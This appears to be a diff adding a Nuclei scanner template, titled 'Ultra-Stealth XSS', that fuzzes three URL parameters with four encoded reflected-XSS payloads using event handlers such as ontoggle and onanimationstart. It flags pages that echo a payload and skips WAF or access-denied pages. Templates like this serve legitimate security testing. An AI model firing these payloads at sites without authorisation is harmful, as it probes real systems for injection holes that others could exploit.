@@ -1,0 +1,50 @@
+id: stealth-beast-v3-universal
+info:
+  name: Ultra-Stealth XSS (Touchpad & Mobile Ready) - Group 3
+  author: Vasil
+  severity: critical
+  tags: dast, xss
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?artist={{fuzz}}&cat={{fuzz}}&id={{fuzz}}"
+
+    payloads:
+      fuzz:
+        - "%22%3E%3Cdetails%2Fopen%2Fontoggle%3Dprint%601337%60%3E"
+        - "%22%3E%3Cbody%2Fonscroll%3Dprint%601337%60%20style%3Ddisplay%3Ablock%3Bheight%3A1000vh%3Bwidth%3A1000vw%3E"
+        - "%22%3E%3Cvideo%2Fautofocus%2Fonfocusin%3Dprint%601337%60%3E"
+        - "%22%3E%3Cx%2Fstyle%3Danimation%3Ax%2Fonanimationstart%3Dprint%601337%60%3E"
+
+    host-redirects: true
+    max-redirects: 1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "\"><details/open/ontoggle=print`1337`>"
+          - "onscroll=print`1337`"
+          - "onfocusin=print`1337`"
+          - "onanimationstart=print`1337`"
+
+      - type: word
+        part: body
+        negative: true
+        condition: or
+        words:
+          - "<title>Access Denied</title>"
+          - "You don't have permission to access"
+          - "unusual traffic from your computer network"
